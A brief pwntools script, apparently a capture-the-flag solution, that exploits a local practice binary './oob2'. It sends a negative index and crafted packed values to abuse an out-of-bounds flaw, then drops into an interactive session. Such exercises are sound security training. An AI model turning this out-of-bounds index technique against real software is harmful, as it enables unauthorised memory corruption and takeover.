from pwn import *
sh=process("./oob2")

sh.sendline("-4")
sh.sendline("0000") 
sh.sendline("1234") #input everything randomly

sh.sendline("0")
sh.sendline("abcd") #input everything randomly
sh.sendline(str(u32("\x30\x30\x30\x30")))
sh.interactive()

